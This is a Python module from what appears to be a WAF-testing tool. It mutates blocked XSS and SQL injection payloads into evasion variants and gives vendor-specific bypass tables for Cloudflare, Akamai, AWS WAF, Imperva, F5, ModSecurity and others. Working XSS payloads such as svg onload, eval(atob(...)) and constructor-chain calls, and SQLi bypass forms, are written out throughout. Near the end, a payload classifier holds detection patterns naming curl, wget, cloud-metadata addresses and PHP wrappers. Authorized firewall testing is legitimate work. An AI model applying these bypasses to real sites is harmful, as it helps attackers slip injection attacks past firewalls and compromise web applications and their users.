"""Payload mutation engine — auto-generate bypass variants from blocked payloads.

Given a payload that was blocked by a WAF, generate N mutated variants using
encoding, case variation, tag substitution, whitespace injection, comment
insertion, and other evasion techniques.

Usage:
    from fray.mutator import mutate_payload
    variants = mutate_payload('<script>alert(1)</script>', max_variants=20)
"""

import html as html_mod
import random
import re
import urllib.parse
from typing import Any, Dict, List, Optional


# ── Mutation strategies ──────────────────────────────────────────────────

def _url_encode(payload: str) -> str:
    """Single URL-encode special characters."""
    return urllib.parse.quote(payload, safe='')


def _double_url_encode(payload: str) -> str:
    """Double URL-encode special characters."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')


def _html_entity_encode(payload: str) -> str:
    """Replace key chars with HTML decimal entities."""
    mapping = {'<': '&#60;', '>': '&#62;', '"': '&#34;', "'": '&#39;',
               '(': '&#40;', ')': '&#41;', '/': '&#47;'}
    out = payload
    for ch, ent in mapping.items():
        out = out.replace(ch, ent)
    return out


def _html_hex_entity_encode(payload: str) -> str:
    """Replace key chars with HTML hex entities."""
    mapping = {'<': '&#x3c;', '>': '&#x3e;', '"': '&#x22;', "'": '&#x27;',
               '(': '&#x28;', ')': '&#x29;', '/': '&#x2f;'}
    out = payload
    for ch, ent in mapping.items():
        out = out.replace(ch, ent)
    return out


def _unicode_escape(payload: str) -> str:
    """Replace ASCII chars with fullwidth Unicode equivalents."""
    mapping = {'<': '\uff1c', '>': '\uff1e', '(': '\uff08', ')': '\uff09',
               '"': '\uff02', "'": '\uff07', '/': '\uff0f'}
    out = payload
    for ch, uni in mapping.items():
        out = out.replace(ch, uni)
    return out


def _case_swap(payload: str) -> str:
    """Randomly swap case of alphabetic characters."""
    return ''.join(
        c.upper() if random.random() > 0.5 else c.lower()
        for c in payload
    )


def _mixed_case_tags(payload: str) -> str:
    """Swap case of HTML tag names only."""
    def _swap_tag(m):
        tag = m.group(1)
        swapped = ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(tag)
        )
        return m.group(0).replace(tag, swapped, 1)
    return re.sub(r'</?([a-zA-Z]+)', _swap_tag, payload)


def _insert_null_bytes(payload: str) -> str:
    """Insert null bytes between tag characters."""
    return payload.replace('<', '<\x00').replace('>', '\x00>')


def _insert_html_comments(payload: str) -> str:
    """Insert HTML comments inside tags to break signatures."""
    # e.g. <scr<!---->ipt> → breaks naive regex
    result = payload
    for tag in ['script', 'img', 'svg', 'iframe', 'body', 'input', 'select',
                'details', 'marquee', 'video', 'audio', 'object', 'embed']:
        if tag in result.lower():
            mid = len(tag) // 2
            broken = tag[:mid] + '<!---->' + tag[mid:]
            result = re.sub(re.escape(tag), broken, result, flags=re.IGNORECASE, count=1)
    return result


def _whitespace_injection(payload: str) -> str:
    """Insert tabs/newlines inside tags."""
    ws_chars = ['\t', '\n', '\r', '\x0c', '\x0b', ' ' * 2]
    result = payload
    # Insert between < and tag name
    result = re.sub(r'<([a-zA-Z])', lambda m: '<' + random.choice(ws_chars) + m.group(1), result, count=1)
    # Insert between attributes
    result = re.sub(r'(\w)=', lambda m: m.group(1) + random.choice(ws_chars) + '=', result, count=2)
    return result


def _newline_in_tag(payload: str) -> str:
    """Insert newlines within tag names."""
    for tag in ['script', 'onerror', 'onload', 'onclick', 'onfocus', 'alert']:
        if tag in payload.lower():
            mid = len(tag) // 2
            broken = tag[:mid] + '\n' + tag[mid:]
            payload = re.sub(re.escape(tag), broken, payload, flags=re.IGNORECASE, count=1)
            break
    return payload


_TAG_ALTERNATIVES = {
    'script': ['svg/onload', 'img/onerror', 'body/onload', 'details/ontoggle',
               'input/onfocus', 'marquee/onstart', 'video/onerror'],
    'img': ['svg', 'video', 'audio', 'input', 'object', 'embed'],
    'svg': ['math', 'img', 'body', 'details'],
}

_EVENT_ALTERNATIVES = {
    'onerror': ['onload', 'onfocus', 'onclick', 'onmouseover', 'ontoggle'],
    'onload': ['onerror', 'onfocus', 'onmouseover', 'onpageshow'],
    'onclick': ['onmouseover', 'onfocus', 'ondblclick'],
    'onfocus': ['onblur', 'oninput', 'onclick'],
}


def _tag_substitution(payload: str) -> str:
    """Replace HTML tags with alternative tags that achieve similar effect."""
    lower = payload.lower()

    # <script>X</script> → <img src=x onerror=X>
    m = re.search(r'<script[^>]*>(.*?)</script>', lower, re.DOTALL)
    if m:
        js_code = m.group(1).strip()
        alts = [
            f'<img src=x onerror={js_code}>',
            f'<svg onload={js_code}>',
            f'<body onload={js_code}>',
            f'<details open ontoggle={js_code}>',
            f'<input onfocus={js_code} autofocus>',
            f'<marquee onstart={js_code}>',
        ]
        return random.choice(alts)

    # Replace event handler
    for evt, alts in _EVENT_ALTERNATIVES.items():
        if evt in lower:
            new_evt = random.choice(alts)
            payload = re.sub(re.escape(evt), new_evt, payload, flags=re.IGNORECASE, count=1)
            # If switching to onfocus, try adding autofocus
            if new_evt == 'onfocus' and 'autofocus' not in lower:
                payload = payload.rstrip('>') + ' autofocus>'
            return payload

    return payload


def _concat_split(payload: str) -> str:
    """Split string literals using JS concatenation."""
    # alert(1) → al'+'ert(1)
    result = payload
    for fn in ['alert', 'confirm', 'prompt', 'eval']:
        if fn in result:
            mid = len(fn) // 2
            result = result.replace(fn, f"{fn[:mid]}'+'{fn[mid:]}", 1)
            break
    return result


def _backtick_substitution(payload: str) -> str:
    """Replace parentheses with backticks for function calls."""
    # alert(1) → alert`1`
    return re.sub(r'(\w+)\(([^)]*)\)', r'\1`\2`', payload, count=1)


def _svg_wrapper(payload: str) -> str:
    """Wrap payload in SVG context."""
    if '<svg' not in payload.lower():
        return f'<svg><desc>{payload}</desc></svg>'
    return payload


def _math_wrapper(payload: str) -> str:
    """Wrap payload in MathML context for parser confusion."""
    if '<math' not in payload.lower():
        return f'<math><mtext>{payload}</mtext></math>'
    return payload


def _data_uri(payload: str) -> str:
    """Convert to data: URI injection."""
    import base64
    encoded = base64.b64encode(payload.encode()).decode()
    return f'<object data="data:text/html;base64,{encoded}">'


def _javascript_uri(payload: str) -> str:
    """Convert JS code to javascript: URI."""
    # Extract JS code from common patterns
    m = re.search(r'(?:onerror|onload|onclick|onfocus)\s*=\s*(.+?)(?:\s|>|$)', payload, re.IGNORECASE)
    if m:
        js = m.group(1).strip('"\'')
        return f'<a href="javascript:{js}">click</a>'
    return payload


def _chunk_encoding_hint(payload: str) -> str:
    """Add Transfer-Encoding hint comment (for documentation)."""
    # Split payload at midpoint — suggests chunked transfer evasion
    mid = len(payload) // 2
    return f'{payload[:mid]}<!--chunk-->{payload[mid:]}'


# ── Main mutation engine ─────────────────────────────────────────────────

# All mutation functions, ordered by likelihood of success
_MUTATIONS = [
    ("mixed_case", _mixed_case_tags),
    ("url_encode", _url_encode),
    ("double_url_encode", _double_url_encode),
    ("html_entity", _html_entity_encode),
    ("html_hex_entity", _html_hex_entity_encode),
    ("unicode_fullwidth", _unicode_escape),
    ("case_swap", _case_swap),
    ("html_comment", _insert_html_comments),
    ("whitespace", _whitespace_injection),
    ("newline_in_tag", _newline_in_tag),
    ("tag_substitution", _tag_substitution),
    ("event_swap", _tag_substitution),
    ("concat_split", _concat_split),
    ("backtick", _backtick_substitution),
    ("svg_wrap", _svg_wrapper),
    ("math_wrap", _math_wrapper),
    ("data_uri", _data_uri),
    ("javascript_uri", _javascript_uri),
    ("null_byte", _insert_null_bytes),
    ("chunk_hint", _chunk_encoding_hint),
]


# ── WAF-vendor-specific mutation strategies ──────────────────────────────
# Known bypass patterns per WAF vendor, curated from real-world research.
# These are tried first when the WAF vendor is known.

_VENDOR_MUTATIONS: Dict[str, List[tuple]] = {
    "cloudflare": [
        ("cf_proto_smuggle", lambda p: p.replace("<script", "<script/x")),
        ("cf_svg_onload", lambda p: p.replace("<script>alert(1)</script>", '<svg onload="alert(1)">')),
        ("cf_double_encode", lambda p: p.replace("<", "%253C").replace(">", "%253E")),
        ("cf_javascript_uri", lambda p: f'<a href="javas\tcript:{p}">x</a>' if "alert" in p else p),
        ("cf_template_literal", lambda p: p.replace("alert(1)", "alert`1`")),
        ("cf_constructor", lambda p: p.replace("alert(1)", "[].constructor.constructor('alert(1)')()")),
        ("cf_svg_animate", lambda p: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>' if "alert" in p else p),
        ("cf_details_ontoggle", lambda p: '<details open ontoggle=alert(1)>' if "alert" in p else p),
        ("cf_unicode_escape", lambda p: p.replace("alert", "\\u0061lert")),
        ("cf_concat_eval", lambda p: p.replace("alert(1)", "window['al'+'ert'](1)")),
        ("cf_settimeout", lambda p: p.replace("alert(1)", "setTimeout('ale'+'rt(1)')")),
        ("cf_atob_bypass", lambda p: p.replace("alert(1)", "eval(atob('YWxlcnQoMSk='))")),
        ("cf_proto_tab", lambda p: p.replace("javascript:", "java\x09script:")),
    ],
    "akamai": [
        ("ak_comment_break", lambda p: p.replace("script", "scr/**/ipt")),
        ("ak_tab_bypass", lambda p: p.replace("<script>", "<script\t>")),
        ("ak_null_mid", lambda p: p[:len(p)//2] + "\x00" + p[len(p)//2:]),
        ("ak_concat_bypass", lambda p: p.replace("'", "' '") if "'" in p else p),
        ("ak_hex_encode", lambda p: "".join(f"\\x{ord(c):02x}" if not c.isalnum() else c for c in p)),
        ("ak_charcode", lambda p: p.replace("alert(1)", "String.fromCharCode(97,108,101,114,116)(1)")),
        ("ak_svg_set", lambda p: '<svg><set onbegin=alert(1)>' if "alert" in p else p),
        ("ak_body_onpageshow", lambda p: '<body onpageshow=alert(1)>' if "alert" in p else p),
        ("ak_unicode_space", lambda p: p.replace(" ", "\u00a0")),
        ("ak_sqli_scientific", lambda p: p.replace("1=1", "1e0=1e0")),
        ("ak_fullwidth_quote", lambda p: p.replace("'", "\uff07")),
    ],
    "aws_waf": [
        ("aws_case_mix", lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN")),
        ("aws_comment_inline", lambda p: p.replace(" ", "/*!")),
        ("aws_version_comment", lambda p: p.replace("UNION", "/*!50000UNION*/")),
        ("aws_chunk_encoding", lambda p: p.replace("script", "scr\r\nipt")),
        ("aws_json_unicode", lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e")),
        ("aws_sqli_newline", lambda p: p.replace("UNION", "UN\nION").replace("SELECT", "SEL\nECT")),
        ("aws_xss_tab_break", lambda p: p.replace("onerror", "on\terror")),
        ("aws_header_inject", lambda p: p.replace(" OR ", " /*!OR*/ ")),
        ("aws_base64_attr", lambda p: '<img src=x onerror=eval(atob`YWxlcnQoMSk=`)>' if "alert" in p else p),
    ],
    "imperva": [
        ("imp_hpc", lambda p: p.replace("/", "//")),
        ("imp_param_frag", lambda p: p.replace("=", "=%00")),
        ("imp_unicode_norm", lambda p: p.replace("a", "\u0430") if "alert" in p else p),  # Cyrillic а
        ("imp_multiline", lambda p: p.replace(" ", "\n")),
        ("imp_sqli_hex_union", lambda p: p.replace("UNION", "UNI%6fN")),
        ("imp_xss_foreignobj", lambda p: '<svg><foreignObject><body onload=alert(1)></foreignObject></svg>' if "alert" in p else p),
        ("imp_tab_before_eq", lambda p: p.replace("=", "\t=")),
        ("imp_backtick_quote", lambda p: p.replace("'", "`")),
        ("imp_double_param", lambda p: f"{p}&_={p}"),
    ],
    "f5_bigip": [
        ("f5_url_full_encode", lambda p: "".join(f"%{ord(c):02x}" for c in p)),
        ("f5_overlong_utf8", lambda p: p.replace("<", "\xc0\xbc").replace(">", "\xc0\xbe")),
        ("f5_sqli_version_comment", lambda p: p.replace("SELECT", "/*!12345SELECT*/")),
        ("f5_xss_html5_events", lambda p: '<video><source onerror=alert(1)>' if "alert" in p else p),
        ("f5_path_double_encode", lambda p: p.replace("/", "%252f")),
        ("f5_newline_split", lambda p: p.replace("<script", "<scr\nipt")),
    ],
    "modsecurity": [
        ("mod_comment_nest", lambda p: p.replace("--", "-- -")),
        ("mod_charset_trick", lambda p: p.replace("'", "\xbf\x27")),  # GBK trick
        ("mod_payload_split", lambda p: p.replace("UNION SELECT", "UNION%0aSELECT")),
        ("mod_sqli_like", lambda p: p.replace("1=1", "1 LIKE 1")),
        ("mod_xss_slash_tag", lambda p: '<img/src/onerror=alert(1)>' if "alert" in p else p),
        ("mod_null_after_tag", lambda p: p.replace("<script", "<script\x00")),
        ("mod_paranoia_comment", lambda p: p.replace(" ", "/**/")),
        ("mod_lfi_double", lambda p: p.replace("../", "....//") if "../" in p else p),
    ],
    "fastly": [
        ("fst_encoding_mix", lambda p: p.replace("<", "%26lt%3b").replace(">", "%3e")),
        ("fst_case_variation", lambda p: p.replace("script", "sCrIpT")),
        ("fst_null_inject", lambda p: p.replace("<", "%00<")),
        ("fst_sqli_having", lambda p: p.replace("1=1", "1 HAVING 1=1")),
    ],
    "sucuri": [
        ("suc_event_swap", lambda p: p.replace("onerror", "onpointerenter")),
        ("suc_sqli_between", lambda p: p.replace("1=1", "1 BETWEEN 1 AND 1")),
        ("suc_xss_constructor", lambda p: p.replace("alert(1)", "[]['flat']['constructor']('alert(1)')()")),
        ("suc_null_byte", lambda p: p.replace("script", "scri%00pt")),
    ],
    "barracuda": [
        ("bar_case_break", lambda p: p.replace("SELECT", "SElect")),
        ("bar_comment_inject", lambda p: p.replace(" ", "/**/") if "SELECT" in p.upper() else p),
        ("bar_xss_details", lambda p: '<details/open/ontoggle=alert`1`>' if "alert" in p else p),
    ],
    "fortinet": [
        ("fort_utf8_overlong", lambda p: p.replace("<", "%C0%BC")),
        ("fort_sqli_union_nl", lambda p: p.replace("UNION", "UN%0aION")),
        ("fort_xss_svg", lambda p: '<svg/onload=alert`1`>' if "alert" in p else p),
    ],
}


def mutate_payload(payload: str,
                   max_variants: int = 20,
                   strategies: Optional[List[str]] = None,
                   waf_vendor: Optional[str] = None) -> List[dict]:
    """Generate mutated variants of a payload.

    Args:
        payload: Original payload string that was blocked.
        max_variants: Maximum number of variants to generate.
        strategies: Optional list of strategy names to use (default: all).
        waf_vendor: Optional WAF vendor name (e.g. "cloudflare", "akamai") for
                    vendor-specific bypass mutations tried first.

    Returns:
        List of dicts: [{"payload": str, "strategy": str, "original": str}, ...]
    """
    # Build mutation list: vendor-specific first (if known), then generic
    mutations = list(_MUTATIONS)
    if waf_vendor:
        vendor_key = waf_vendor.lower().replace(" ", "_").split("(")[0].strip("_")
        vendor_muts = _VENDOR_MUTATIONS.get(vendor_key, [])
        if not vendor_muts:
            for vk, vm in _VENDOR_MUTATIONS.items():
                if vk in vendor_key or vendor_key in vk:
                    vendor_muts = vm
                    break
        if vendor_muts:
            mutations = vendor_muts + mutations

    if strategies:
        strategy_set = set(strategies)
        mutations = [(name, fn) for name, fn in mutations if name in strategy_set]

    variants = []
    seen = {payload}  # Deduplicate

    for name, fn in mutations:
        if len(variants) >= max_variants:
            break
        try:
            mutated = fn(payload)
            if mutated and mutated not in seen and mutated != payload:
                seen.add(mutated)
                variants.append({
                    "payload": mutated,
                    "strategy": name,
                    "original": payload,
                })
        except Exception:
            continue

    # If we haven't hit max, try compound mutations (apply 2 strategies)
    if len(variants) < max_variants:
        base_variants = list(variants)
        for v in base_variants:
            if len(variants) >= max_variants:
                break
            for name, fn in mutations[:10]:
                if len(variants) >= max_variants:
                    break
                try:
                    compound = fn(v["payload"])
                    if compound and compound not in seen:
                        seen.add(compound)
                        variants.append({
                            "payload": compound,
                            "strategy": f"{v['strategy']}+{name}",
                            "original": payload,
                        })
                except Exception:
                    continue

    return variants[:max_variants]


# ── Payload clustering by technique family ────────────────────────────────

_TECHNIQUE_PATTERNS: List[tuple] = [
    # Order matters: more specific patterns first so they win in frequency count.
    # (family, sub_technique, regex_pattern)
    # ── High-specificity patterns (check first) ──
    ("xxe", "entity_decl", re.compile(r'<!ENTITY|<!DOCTYPE.*\[', re.I)),
    ("crlf", "header_inject", re.compile(r'%0[dD]%0[aA]|\\r\\n', re.I)),
    ("prototype_pollution", "proto", re.compile(r'__proto__|constructor\[|prototype\[', re.I)),
    ("open_redirect", "redirect_url", re.compile(r'(redirect|url|next|return|goto)\s*=\s*https?://', re.I)),
    ("ssti", "jinja2", re.compile(r'__class__|__mro__|__subclasses__', re.I)),
    ("ssti", "template_expr", re.compile(r'\{\{.*\}\}|\$\{.*\}|<%.*%>', re.I)),
    # ── XSS ──
    ("xss", "script_tag", re.compile(r'<script', re.I)),
    ("xss", "event_handler", re.compile(r'\bon\w+\s*=', re.I)),
    ("xss", "svg_injection", re.compile(r'<svg|<math', re.I)),
    ("xss", "javascript_uri", re.compile(r'javascript\s*:', re.I)),
    ("xss", "data_uri", re.compile(r'data\s*:\s*text/html', re.I)),
    ("xss", "dom_manipulation", re.compile(r'document\.(cookie|write|location)|innerHTML', re.I)),
    # ── SQLi ──
    ("sqli", "union_based", re.compile(r'UNION\s+(ALL\s+)?SELECT', re.I)),
    ("sqli", "boolean_blind", re.compile(r'\bOR\s+\d+=\d+|\bAND\s+\d+=\d+', re.I)),
    ("sqli", "time_blind", re.compile(r'SLEEP\s*\(|WAITFOR\s+DELAY|pg_sleep|BENCHMARK', re.I)),
    ("sqli", "error_based", re.compile(r'EXTRACTVALUE|UPDATEXML|XMLTYPE|CONVERT\(', re.I)),
    ("sqli", "stacked_query", re.compile(r';\s*(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE)', re.I)),
    ("sqli", "comment_bypass", re.compile(r'/\*!?\d*\w+\*/|--\s', re.I)),
    # ── SSRF ──
    ("ssrf", "cloud_metadata", re.compile(r'169\.254\.169\.254|metadata\.google', re.I)),
    ("ssrf", "url_scheme", re.compile(r'(gopher|dict)://', re.I)),
    # ── LFI ──
    ("lfi", "path_traversal", re.compile(r'\.\./|\.\.\\|%2e%2e', re.I)),
    ("lfi", "null_byte", re.compile(r'%00|\\x00', re.I)),
    ("lfi", "wrapper", re.compile(r'php://|expect://|zip://', re.I)),
    # ── RCE ──
    ("rce", "command_injection", re.compile(r'[;|`]\s*\w+|&&\s*\w+|\$\(', re.I)),
    ("rce", "os_command", re.compile(r'\b(cat|ls|whoami|id|uname|ping|curl|wget)\b', re.I)),
]


def classify_payload(payload: str) -> Dict[str, Any]:
    """Classify a payload into technique family and sub-technique.

    Returns dict with:
      - family: str (xss, sqli, ssrf, lfi, rce, ssti, xxe, crlf, etc.)
      - sub_technique: str (e.g. "union_based", "event_handler")
      - techniques: list of all matched (family, sub_technique) pairs
      - confidence: float 0-1
    """
    matches = []
    for family, sub, pattern in _TECHNIQUE_PATTERNS:
        if pattern.search(payload):
            matches.append((family, sub))

    if not matches:
        return {"family": "unknown", "sub_technique": "unknown",
                "techniques": [], "confidence": 0.0}

    # Primary family = most frequent match
    from collections import Counter
    family_counts = Counter(f for f, _ in matches)
    primary_family = family_counts.most_common(1)[0][0]
    primary_sub = next(s for f, s in matches if f == primary_family)

    return {
        "family": primary_family,
        "sub_technique": primary_sub,
        "techniques": matches,
        "confidence": min(1.0, len(matches) * 0.25),
    }


def cluster_payloads(payloads: List[str]) -> Dict[str, List[str]]:
    """Group payloads by technique family.

    Returns dict mapping family name → list of payloads.
    """
    clusters: Dict[str, List[str]] = {}
    for p in payloads:
        info = classify_payload(p)
        family = info["family"]
        clusters.setdefault(family, []).append(p)
    return clusters


def cluster_results(results: List[dict]) -> Dict[str, List[dict]]:
    """Group test results by technique family.

    Returns dict mapping family → list of result dicts (with 'technique' added).
    """
    clusters: Dict[str, List[dict]] = {}
    for r in results:
        payload = r.get("payload", "")
        info = classify_payload(payload)
        r["technique_family"] = info["family"]
        r["technique_sub"] = info["sub_technique"]
        clusters.setdefault(info["family"], []).append(r)
    return clusters


def mutate_blocked_results(results: List[dict],
                           max_per_payload: int = 10) -> List[dict]:
    """Take test results and generate mutations for all blocked payloads.

    Args:
        results: List of test result dicts (from WAFTester.test_payloads).
        max_per_payload: Max mutations per blocked payload.

    Returns:
        List of mutation dicts ready for re-testing.
    """
    all_mutations = []
    for r in results:
        if r.get('blocked', False):
            original = r.get('payload', '')
            if original:
                mutations = mutate_payload(original, max_variants=max_per_payload)
                all_mutations.extend(mutations)
    return all_mutations
